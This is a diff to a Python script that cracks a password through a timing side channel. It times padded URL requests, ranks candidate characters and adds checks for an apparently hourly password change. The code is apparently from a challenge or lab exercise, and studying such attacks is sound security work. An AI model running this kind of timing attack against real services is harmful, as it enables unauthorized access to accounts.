@@ -33,7 +33,7 @@ def timeit(url2check,  repeat=1):
     removed = remove_4(times)
     if repeat > 15:
         removed = remove_4(removed)
-        
+
     return mean(removed)
 
 
@@ -86,6 +86,11 @@ def find_cur_letter(url, pool, padding_length):
     print('=========================')
     print('Checking 4 lowest keys...')
     for i in range(4):
+        last_key_letter = current_letter
+        check_hour_change()
+        if last_key_letter != current_letter:
+            return current_letter
+        
         test_url = url + sorted_timings[i][0] * padding_length
         t = timeit(test_url, REPEAT_CHECK + 5)
         lowest_time_chars[sorted_timings[i][0]] = t
@@ -178,6 +183,8 @@ def hack_password(url, pool, max_length, padding_length):
             print('=============================')
             print('Checking 4 lowest chars...')
             for j in range(4):
+                check_hour_change()
+                
                 test_pass = [current_letter] * padding_length
                 test_pass[i + max_length] = sorted_timings[j][0]
                 test_url = url + ''.join(test_pass)
